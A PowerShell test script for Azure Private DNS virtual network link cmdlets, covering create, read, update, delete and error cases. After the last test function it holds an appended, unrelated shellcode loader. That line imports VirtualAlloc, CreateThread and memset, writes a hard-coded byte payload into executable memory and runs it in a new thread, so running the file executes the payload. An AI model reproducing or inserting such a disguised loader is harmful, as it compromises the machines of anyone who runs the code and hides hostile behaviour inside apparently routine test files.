












function Test-LinkCrud
{
	$createdLink = Create-VirtualNetworkLink $false

	Assert-NotNull $createdLink
	Assert-NotNull $createdLink.Etag
	Assert-NotNull $createdLink.Name
	Assert-NotNull $createdLink.ZoneName
	Assert-NotNull $createdLink.ResourceGroupName
	Assert-AreEqual 1 $createdLink.Tags.Count
	Assert-AreEqual $false $createdLink.RegistrationEnabled
	Assert-AreNotEqual $createdLink.VirtualNetworkId $createdZone.VirtualNetworkId
	Assert-AreEqual $createdLink.ProvisioningState "Succeeded"
	Assert-Null $createdLink.Type

	$retrievedLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name

	Assert-NotNull $retrievedLink
	Assert-NotNull $retrievedLink.Etag
	Assert-AreEqual $createdLink.Name $retrievedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $retrievedLink.ResourceGroupName
	Assert-AreEqual $retrievedLink.Etag $createdLink.Etag
	Assert-AreEqual 1 $retrievedLink.Tags.Count
	Assert-AreEqual $createdLink.VirtualNetworkId $retrievedLink.VirtualNetworkId
	Assert-AreEqual $createdLink.ZoneName $retrievedLink.ZoneName
	Assert-AreEqual $createdLink.RegistrationEnabled $retrievedLink.RegistrationEnabled
	Assert-AreEqual $retrievedLink.ProvisioningState "Succeeded"
	Assert-Null $retrievedLink.Type

	$updatedLink = Set-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name -Tag @{tag1="value1";tag2="value2"}

	Assert-NotNull $updatedLink
	Assert-NotNull $updatedLink.Etag
	Assert-AreEqual $createdLink.Name $updatedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $updatedLink.ResourceGroupName
	Assert-AreNotEqual $updatedLink.Etag $createdLink.Etag
	Assert-AreEqual 2 $updatedLink.Tags.Count
	Assert-AreEqual $updatedLink.ProvisioningState "Succeeded"
	Assert-Null $updatedLink.Type

	$retrievedLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name

	Assert-NotNull $retrievedLink
	Assert-NotNull $retrievedLink.Etag
	Assert-AreEqual $createdLink.Name $retrievedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $retrievedLink.ResourceGroupName
	Assert-AreEqual $retrievedLink.Etag $updatedLink.Etag
	Assert-AreEqual 2 $retrievedLink.Tags.Count
	Assert-AreEqual $retrievedLink.ProvisioningState "Succeeded"
	Assert-Null $retrievedLink.Type

	$removed = Remove-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name -PassThru -Confirm:$false

	Assert-True { $removed }

	Assert-Throws { Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name }
	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force	
}


function Test-LinkCrudWithPiping
{
	$createdLink = Create-VirtualNetworkLink $false

	Assert-NotNull $createdLink
	Assert-NotNull $createdLink.Etag
	Assert-NotNull $createdLink.Name
	Assert-NotNull $createdLink.ZoneName
	Assert-NotNull $createdLink.ResourceGroupName
	Assert-AreEqual 1 $createdLink.Tags.Count
	Assert-AreEqual $false $createdLink.RegistrationEnabled
	Assert-AreNotEqual $createdLink.VirtualNetworkId $createdZone.VirtualNetworkId
	Assert-AreEqual $createdLink.ProvisioningState "Succeeded"
	Assert-Null $createdLink.Type

	$retrievedLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name

	Assert-NotNull $retrievedLink
	Assert-NotNull $retrievedLink.Etag
	Assert-AreEqual $createdLink.Name $retrievedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $retrievedLink.ResourceGroupName
	Assert-AreEqual $retrievedLink.Etag $createdLink.Etag
	Assert-AreEqual 1 $retrievedLink.Tags.Count
	Assert-AreEqual $createdLink.VirtualNetworkId $retrievedLink.VirtualNetworkId
	Assert-AreEqual $createdLink.ZoneName $retrievedLink.ZoneName
	Assert-AreEqual $createdLink.RegistrationEnabled $retrievedLink.RegistrationEnabled
	Assert-AreEqual $retrievedLink.ProvisioningState "Succeeded"
	Assert-Null $retrievedLink.Type

	$updatedLink = $createdLink | Set-AzPrivateDnsVirtualNetworkLink -Tag @{tag1="value1";tag2="value2"}

	Assert-NotNull $updatedLink
	Assert-NotNull $updatedLink.Etag
	Assert-AreEqual $createdLink.Name $updatedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $updatedLink.ResourceGroupName
	Assert-AreNotEqual $updatedLink.Etag $createdLink.Etag
	Assert-AreEqual 2 $updatedLink.Tags.Count
	Assert-AreEqual $updatedLink.ProvisioningState "Succeeded"
	Assert-Null $updatedLink.Type

	$retrievedLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name

	Assert-NotNull $retrievedLink
	Assert-NotNull $retrievedLink.Etag
	Assert-AreEqual $createdLink.Name $retrievedLink.Name
	Assert-AreEqual $createdLink.ResourceGroupName $retrievedLink.ResourceGroupName
	Assert-AreEqual $retrievedLink.Etag $updatedLink.Etag
	Assert-AreEqual 2 $retrievedLink.Tags.Count
	Assert-AreEqual $retrievedLink.ProvisioningState "Succeeded"
	Assert-Null $retrievedLink.Type

	$removed = $retrievedLink | Remove-AzPrivateDnsVirtualNetworkLink -PassThru -Confirm:$false

	Assert-True { $removed }

	Assert-Throws { Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name }
	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force	
}


function Test-RegistrationLinkCreate
{
	
	$createdLink = Create-VirtualNetworkLink $true

	Assert-NotNull $createdLink
	Assert-AreEqual $true $createdLink.RegistrationEnabled
	Assert-AreEqual $createdLink.ProvisioningState "Succeeded"

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-LinkAlreadyExistsCreateThrow
{
	$createdLink1 = Create-VirtualNetworkLink $false

	$message = "*exists already and hence cannot be created again*"
	Assert-ThrowsLike { New-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink1.zoneName -ResourceGroupName $createdLink1.ResourceGroupName -Name $createdLink1.Name -Tag @{tag1="value2"} -VirtualNetworkId $createdLink1.VirtualNetworkId } $message

	Remove-AzResourceGroup -Name $createdLink1.ResourceGroupName -Force
}


function Test-CreateLinkWithVirtualNetworkObject
{
	$zoneName = Get-RandomZoneName
	$linkName = Get-RandomLinkName
    $resourceGroup = TestSetup-CreateResourceGroup

	$createdZone = New-AzPrivateDnsZone -Name $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Tag @{tag1="value1"}
	$createdVirtualNetwork = TestSetup-CreateVirtualNetwork $resourceGroup
	$createdLink = New-AzPrivateDnsVirtualNetworkLink -ZoneName $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Name $linkName -Tag @{tag1="value1"} -VirtualNetwork $createdVirtualNetwork -EnableRegistration

	Assert-NotNull $createdLink
	Assert-NotNull $createdLink.Etag
	Assert-NotNull $createdLink.Name
	Assert-NotNull $createdLink.ZoneName
	Assert-NotNull $createdLink.ResourceGroupName
	Assert-AreEqual 1 $createdLink.Tags.Count
	Assert-AreEqual $true $createdLink.RegistrationEnabled
	Assert-AreEqual $createdLink.VirtualNetworkId $createdVirtualNetwork.Id
	Assert-AreEqual $createdLink.ProvisioningState "Succeeded"
	Assert-Null $createdLink.Type

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force

}


function Test-CreateLinkWithRemoteVirtualId
{
	$zoneName = Get-RandomZoneName
	$linkName = Get-RandomLinkName
	$resourceGroup = TestSetup-CreateResourceGroup
	
	
	$createdZone = New-AzPrivateDnsZone -Name $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Tag @{tag1="value1"}
	$createdLink = New-AzPrivateDnsVirtualNetworkLink -ZoneName $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Name $linkName -Tag @{tag1="value2"} -RemoteVirtualNetworkId $vnet2Id -EnableRegistration

	Assert-NotNull $createdLink
	Assert-NotNull $createdLink.Etag
	Assert-NotNull $createdLink.Name
	Assert-NotNull $createdLink.ZoneName
	Assert-NotNull $createdLink.ResourceGroupName
	Assert-AreEqual 1 $createdLink.Tags.Count
	Assert-AreEqual $true $createdLink.RegistrationEnabled
	Assert-AreEqual $createdLink.VirtualNetworkId $vnet2
	Assert-AreEqual $createdLink.ProvisioningState "Succeeded"
	Assert-Null $createdLink.Type

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force

}


function Test-UpdateLinkRegistrationStatusWithPiping
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$createdLink.RegistrationEnabled = $true
	$updatedLink = $createdLink | Set-AzPrivateDnsVirtualNetworkLink	
	Assert-AreEqual $updatedLink.RegistrationEnabled $true

	$updatedLink.RegistrationEnabled = $false
	$reUpdatedLink = $updatedLink | Set-AzPrivateDnsVirtualNetworkLink
	Assert-AreEqual $updatedLink.RegistrationEnabled $false

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-UpdateLinkRegistrationStatusWithResourceId
{
	$createdLink = Create-VirtualNetworkLink $false
	$updatedLink = Set-AzPrivateDnsVirtualNetworkLink -ResourceId $createdLink.ResourceId -IsRegistrationEnabled $true -Tag @{}
	
	Assert-AreEqual $updatedLink.RegistrationEnabled $true
	Assert-AreEqual 0 $updatedLink.Tags.Count

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-DeleteLinkWithResourceId
{
	$createdLink = Create-VirtualNetworkLink $false
	$deletedLink = Remove-AzPrivateDnsVirtualNetworkLink -ResourceId $createdLink.ResourceId -PassThru
	
	Assert-True { $deletedLink }
	Assert-Throws { Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name }

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}



function Test-UpdateLinkWithEtagMismatchThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	$createdLink.RegistrationEnabled = $true
	$createdLink.Etag = "gibberish"
	
	Assert-ThrowsLike { $createdLink | Set-AzPrivateDnsVirtualNetworkLink } "*(etag mismatch)*"

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-UpdateLinkWithEtagMismatchOverwrite
{
	$createdLink = Create-VirtualNetworkLink $false
	Assert-AreEqual $createdLink.RegistrationEnabled $false

	$createdLink.RegistrationEnabled = $true
	$createdLink.Etag = "gibberish"
	
	$updatedLink = $createdLink | Set-AzPrivateDnsVirtualNetworkLink -Overwrite
	Assert-AreEqual $updatedLink.RegistrationEnabled $true
	Assert-AreEqual $updatedLink.ProvisioningState "Succeeded"

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-UpdateLinkZoneNotExistsThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$message = "*The resource * under resource group * was not found*"
	Assert-ThrowsLike { Set-AzPrivateDnsVirtualNetworkLink -ZoneName "nonexistingzone.com" -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name -Tag @{tag1="value1";tag2="value2"} } $message

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-UpdateLinkLinkNotExistsThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$message = "*The resource * under resource group * was not found*"
	Assert-ThrowsLike { Set-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name "nonexistinglink" -Tag @{tag1="value1";tag2="value2"} } $message

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-UpdateLinkWithNoChangesShouldNotThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$updatedLink = $createdLink | Set-AzPrivateDnsVirtualNetworkLink
	Assert-AreEqual $updatedLink.ProvisioningState "Succeeded"

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-GetLinkZoneNotExistsThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$message = "*The resource * under resource group * was not found*"
	Assert-ThrowsLike { Get-AzPrivateDnsVirtualNetworkLink -ZoneName "nonexistingzone.com" -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name } $message

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-GetLinkLinkNotExistsThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	$message = "*The resource * under resource group * was not found*"
	Assert-ThrowsLike { Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name "nonexistinglink" } $message

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}

function Test-RemoveLinkZoneNotExistsShouldNotThrow
{
	$createdLink = Create-VirtualNetworkLink $false
	
	Remove-AzPrivateDnsVirtualNetworkLink -ZoneName "nonexistingzone.com" -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name

	$getLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name
	Assert-NotNull $getLink
	Assert-AreEqual $getLink.RegistrationEnabled $false

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-RemoveLinkLinkNotExistsShouldNotThrow
{
	$createdLink = Create-VirtualNetworkLink $false

	Remove-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name "nonexistinglink"

	$getLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $createdLink.ZoneName -ResourceGroupName $createdLink.ResourceGroupName -Name $createdLink.Name
	Assert-NotNull $getLink
	Assert-AreEqual $getLink.RegistrationEnabled $false

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


function Test-ListLinks
{
	$linkName1 = Get-RandomLinkName
	$linkName2 = Get-RandomLinkName
	$zoneName = Get-RandomZoneName
    $resourceGroup = TestSetup-CreateResourceGroup

	$createdZone = New-AzPrivateDnsZone -Name $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Tag @{tag1="value1"}
	
	$createdVirtualNetwork1 = TestSetup-CreateVirtualNetwork $resourceGroup
	$createdVirtualNetwork2 = TestSetup-CreateVirtualNetwork $resourceGroup
	
	$createdLink1 = New-AzPrivateDnsVirtualNetworkLink -ZoneName $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Name $linkName1 -Tag @{tag1="value1"} -VirtualNetworkId $createdVirtualNetwork1.Id
	$createdLink2 = New-AzPrivateDnsVirtualNetworkLink -ZoneName $zoneName -ResourceGroupName $resourceGroup.ResourceGroupName -Name $linkName2 -Tag @{tag1="value1"} -VirtualNetworkId $createdVirtualNetwork2.Id

	$getLink = Get-AzPrivateDnsVirtualNetworkLink -ZoneName $zoneName -ResourceGroupName $createdLink1.ResourceGroupName
	
	Assert-NotNull $getLink
	Assert-AreEqual 2 $getLink.Count

	Remove-AzResourceGroup -Name $createdLink.ResourceGroupName -Force
}


$Gn4 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Gn4 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xaa,0x0b,0x8a,0x46,0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xa5,0xe9,0x7f,0xba,0x51,0x6f,0x7f,0x43,0xa1,0x10,0x09,0xa6,0x90,0x10,0x6d,0xa2,0x82,0xa0,0xe5,0xe6,0x2e,0x4a,0xab,0x12,0xa5,0x3e,0x64,0x14,0x0e,0xf4,0x52,0x1b,0x8f,0xa5,0xa7,0x3a,0x13,0xb4,0xfb,0x9c,0x2a,0x77,0x0e,0xdc,0x6b,0x6a,0xe3,0x8c,0x24,0xe0,0x56,0x21,0x41,0xbc,0x6a,0xca,0x19,0x50,0xeb,0x2f,0xe9,0x53,0xda,0xe1,0x62,0x0a,0xfc,0x00,0xa7,0x26,0xb5,0x1a,0xa4,0x03,0x0f,0x90,0x1e,0xff,0x8e,0x70,0x6f,0x00,0x3c,0xbd,0x40,0xf3,0x3c,0xf9,0x66,0xec,0x4a,0xf3,0x95,0x91,0x4c,0xc0,0xe4,0x4d,0xd8,0xd3,0x4e,0x05,0x7a,0x38,0x6f,0xca,0x1d,0xcb,0x63,0xa7,0x6a,0x93,0x67,0x36,0xbe,0xaf,0x93,0xb3,0x41,0x60,0x12,0x87,0x65,0xa4,0x7f,0x53,0x07,0xfd,0x25,0x32,0x38,0x1d,0x86,0xeb,0x9c,0x55,0x2a,0xff,0xac,0x37,0x22,0xcc,0x9c,0xc7,0xb2,0x5a,0x96,0xb4,0x80,0xc5,0x0c,0x53,0xa8,0x8e,0x8a,0xa4,0xcf,0xa4,0x6b,0x3a,0x2e,0x47,0x8c,0x12,0xf4,0x13,0xdc,0x0c,0xdd,0x1b,0xb7,0xcc,0xe2,0xc9,0x22,0xc8,0x74,0x52,0x02,0x24,0x63,0xfa,0x61,0xc9,0x7a,0xa7,0xec,0x2f,0x2c,0x07,0xbf,0xff,0x8c,0xf7,0x7f,0x50,0x64,0x12,0x70,0x8f,0x94,0x1d,0x5a,0xb8,0x3e,0xf2,0x33,0x90,0xd6,0x6b,0x1e,0x6a,0x47,0x73,0xb4,0x16,0x47,0xff,0x3b,0xe6,0x09,0x08,0x31,0xf4,0xfd,0xf8,0x0c,0xa6,0xab,0x07,0xbb,0xcd,0x53,0x92,0x40,0x44,0x04,0x0a,0x4b,0xb1,0x62,0x95,0xb4,0x94,0xf9,0x1c,0x21,0x57,0x95,0x60,0xa5,0x57,0x65,0x37,0xaf,0x57,0x0d,0xef,0x8b,0x0b,0x28,0xf0,0x01,0x38,0xe1,0x65,0xaa,0x69,0x56,0x2d,0xc2,0x97,0x81,0x19,0x4d,0x67,0xe4,0x9b,0xb1,0xbe,0xc0,0xe9,0xdb,0x02;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$eEvp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($eEvp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$eEvp,0,0,0);for (;;){Start-sleep 60};

